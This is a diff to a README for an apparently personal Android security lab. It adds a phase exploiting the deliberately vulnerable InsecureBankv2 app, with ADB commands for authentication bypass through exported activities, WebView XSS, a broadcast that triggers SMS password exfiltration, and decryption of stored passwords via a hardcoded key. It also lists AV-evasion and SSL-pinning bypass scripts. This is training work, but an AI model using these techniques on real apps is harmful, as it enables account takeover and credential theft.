@@ -150,12 +150,83 @@ mitmproxy then decrypts and logs credentials in plaintext — even if the app ha
 
 ---
 
+## Phase 3 — Static Analysis & Full Vulnerability Exploitation
+
+**Target:** InsecureBankv2 — deliberately vulnerable Android banking app  
+**Method:** APK decompilation with `jadx` → source code review → ADB exploit execution
+
+### Decompilation
+
+```bash
+jadx -d /tmp/insecurebank_src /tmp/insecurebank.apk
+# Produces ~40 readable Java source files
+```
+
+### Vulnerabilities Found & Exploited
+
+| # | Vulnerability | Location | Severity |
+|---|--------------|----------|----------|
+| 1 | Hardcoded AES-256 key + zero IV | `CryptoClass.java:22` | Critical |
+| 2 | Plaintext credential logging to logcat | `DoLogin.java:115` | Critical |
+| 3 | 5 exported components — no auth required | `AndroidManifest.xml` | Critical |
+| 4 | BroadcastReceiver SMS password exfiltration | `MyBroadCastReceiver.java:29` | Critical |
+| 5 | ViewStatement WebView XSS (JS enabled) | `ViewStatement.java:26` | High |
+| 6 | HTTP (not HTTPS) used for all requests | `DoLogin.java:51` | High |
+| 7 | Exported ContentProvider leaks login history | `TrackUserContentProvider.java` | Medium |
+
+### Exploits — All Confirmed
+
+**Authentication bypass — PostLogin (no credentials needed):**
+```bash
+adb shell "am start -n com.android.insecurebankv2/.PostLogin --es uname 'hacker'"
+```
+![PostLogin Bypass](screenshots/postlogin_auth_bypass.png)
+
+**Authentication bypass — DoTransfer (money transfer screen without login):**
+```bash
+adb shell "am start -n com.android.insecurebankv2/.DoTransfer --es uname 'hacker'"
+```
+![DoTransfer Bypass](screenshots/dotransfer_auth_bypass.png)
+
+**WebView XSS — JavaScript execution inside the banking app:**
+```bash
+adb push xss_payload.html /sdcard/Statements_hacker.html
+adb shell "am start -n com.android.insecurebankv2/.ViewStatement --es uname 'hacker'"
+```
+![ViewStatement XSS](screenshots/viewstatement_xss.png)
+
+**BroadcastReceiver SMS exfiltration:**
+```bash
+adb shell "am broadcast -a theBroadcast \
+  --es phonenumber '15555215554' \
+  --es newpass 'hacked123' \
+  -n com.android.insecurebankv2/.MyBroadCastReceiver"
+# Broadcast completed: result=0
+```
+
+**AES decryption — hardcoded key reverses all stored passwords:**
+```
+$ python3 scripts/decrypt_creds.py
+Plaintext          Ciphertext (stored in SharedPreferences)    Decrypted
+-----------------------------------------------------------------------
+Dinesh@123!        0JQhVcadBP6rBi9y0nf9wA==                   Dinesh@123!
+Jack@123!          fnxTrBBr3vebTuNccGD5Bw==                   Jack@123!
+```
+
+See `scripts/decrypt_creds.py` for full decryption PoC.
+
+---
+
 ## What This Demonstrates
 
 - Setting up a professional Android security research environment
 - Systematic AV evasion methodology (static → encoded → runtime)
 - Dynamic instrumentation with Frida — hooking live Java methods at runtime
 - HTTPS traffic interception with mitmproxy after SSL pinning bypass
+- APK decompilation with `jadx` — extracting full Java source from compiled APKs
+- Source code auditing — finding hardcoded keys, exported components, unsafe WebViews
+- ADB intent exploitation — launching protected activities without authentication
+- Android component security — exported BroadcastReceivers, Activities, ContentProviders
 - Understanding the difference between **signature-based** and **behavior-based** detection
 - Responsible disclosure mindset — findings documented for defensive improvement
 
@@ -169,12 +240,17 @@ android-av-research/
 ├── scripts/
 │   ├── setup_lab.sh        ← Full lab setup script
 │   ├── dropper.sh          ← Runtime payload assembler (runs on device)
-│   └── encode_payload.sh   ← Base64 encoding bypass demo
+│   ├── encode_payload.sh   ← Base64 encoding bypass demo
+│   ├── ssl_bypass.js       ← Frida script: bypass SSL pinning (5 hooks)
+│   └── decrypt_creds.py    ← AES decryption PoC using hardcoded key
 ├── screenshots/
-│   ├── avg_welcome.png     ← AVG installed and running
-│   └── avg_detections.png  ← Scan results showing detections
+│   ├── avg_welcome.png             ← AVG installed and running
+│   ├── avg_detections.png          ← Scan results showing detections
+│   ├── postlogin_auth_bypass.png   ← Banking dashboard without login
+│   ├── dotransfer_auth_bypass.png  ← Transfer screen without login
+│   └── viewstatement_xss.png      ← JavaScript executed in banking WebView
 └── writeup/
-    └── methodology.md      ← Detailed technical methodology
+    └── what_i_did.md       ← Complete step-by-step methodology
 ```
 
 ---
